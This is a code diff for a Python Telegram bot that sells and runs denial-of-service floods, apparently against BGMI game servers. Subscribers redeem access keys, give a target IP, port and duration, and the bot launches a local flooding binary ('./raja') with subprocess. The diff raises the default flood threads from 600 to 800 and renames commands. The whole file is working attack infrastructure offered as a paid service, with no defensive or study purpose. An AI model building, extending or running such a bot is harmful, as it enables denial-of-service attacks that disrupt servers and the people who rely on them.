@@ -4,8 +4,6 @@ import os
 import random
 import string
 import datetime
-import asyncio
-import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from rajaji import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
@@ -14,7 +12,7 @@ USER_FILE = "users.json"
 KEY_FILE = "keys.json"
 flooding_process = None
 flooding_command = None
-DEFAULT_THREADS = 600
+DEFAULT_THREADS = 800
 users = {}
 keys = {}
 
@@ -127,7 +125,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./raja', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 🚀\n\n💣𝙃𝙊𝙎𝙏-> {target_ip}\n💣𝙋𝙊𝙍𝙏-> {port} \n💣𝙏𝙄𝙈𝙀-> {duration}\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
+    await update.message.reply_text(f'🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 🚀\n\n💣𝙃𝙊𝙎𝙏-> {target_ip}\n💣𝙋𝙊𝙍𝙏-> {port} \n💣𝙏𝙄𝙈𝙀-> {duration}\n\n🇮🇳  𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -135,7 +133,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
+        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /raja\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
         return
 
     if flooding_process is not None:
@@ -143,11 +141,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_command is None:
-        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04')
+        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /raja\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04')
         return
 
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n𝙁𝘿𝘽𝙆-> @rajaraj_04\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
+    await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n𝙁𝘿𝘽𝙆-> @rajaraj_04\n\n🇮🇳  𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
 
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -155,7 +153,7 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
+        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /raja\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
         return
 
     if flooding_process is None:
@@ -168,8 +166,9 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     
     await update.message.reply_text(response)
 
-# Update the RAJA_command function to include buttons
-async def RAJA_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+# Update the raja_command function to include buttons
+async def raja_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    # Create buttons
     markup = ReplyKeyboardMarkup(
         [
             [KeyboardButton("/bgmi"), KeyboardButton("/start")],
@@ -186,35 +185,21 @@ async def RAJA_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/start-> 🚀 𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆\n"
         "/stop-> 🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆\n\n"
         f"✅𝙊𝙒𝙉𝙀𝙍-> {OWNER_USERNAME}"
-    )
+    ) # Send message with the keyboard buttons
     await update.message.reply_text(response, reply_markup=markup)
 
-
 def main() -> None:
-   application = ApplicationBuilder().token(BOT_TOKEN).build()
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-   application.add_handler(CommandHandler("genkey", genkey))
-   application.add_handler(CommandHandler("redeem", redeem))
-   application.add_handler(CommandHandler("bgmi", bgmi))
-   application.add_handler(CommandHandler("start", start))
-   application.add_handler(CommandHandler("stop", stop))
-   application.add_handler(CommandHandler("RAJA", RAJA_command))
+    application.add_handler(CommandHandler("genkey", genkey))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("stop", stop))
+    application.add_handler(CommandHandler("raja", raja_command))
 
-   load_data()
-   application.run_polling()
+    load_data()
+    application.run_polling()
 
 if __name__ == '__main__':
-   # Start the bot in a separate thread or process to allow the background loop to run simultaneously.
-   import threading
-   
-   def run_bot():
-       main()
-
-   bot_thread = threading.Thread(target=run_bot)
-   bot_thread.start()
-
-   # Background loop to keep the script running and print status.
-   while True:
-       print("Still running...")
-       time.sleep(60)  # Adjust the interval as needed.
-        
+    main()
